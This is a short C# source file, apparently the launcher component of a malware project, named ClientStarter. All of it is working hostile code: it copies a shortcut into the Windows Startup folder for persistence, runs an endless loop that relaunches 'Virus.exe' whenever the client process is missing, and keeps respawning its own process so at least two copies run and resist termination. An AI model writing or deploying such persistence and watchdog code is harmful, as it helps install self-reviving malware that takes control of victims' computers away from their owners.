using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using NamesSpace;


public class ClientStarter {

    public static void Main(string[] args) {
        new ClientStarter();
    }

    public ClientStarter() {
        CopyShortcut(true);

        while(true) {
            try {
                CopyShortcut(false);
            } catch(IOException) {

            }

            if (Process.GetProcessesByName(Names.CLIENT).Length == 0) {
                Process.Start("Virus.exe");
            }

            Thread.Sleep(50);

            while (Process.GetProcessesByName(Names.STARTER).Length < 2) {
                Process.Start(Process.GetCurrentProcess().ProcessName);
            }
        }
    }

    private void CopyShortcut(bool overwrite) {
        File.Copy(Names.SHORTCUT + ".lnk", Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "/" + Names.CLIENT + ".lnk", overwrite);
    }

}

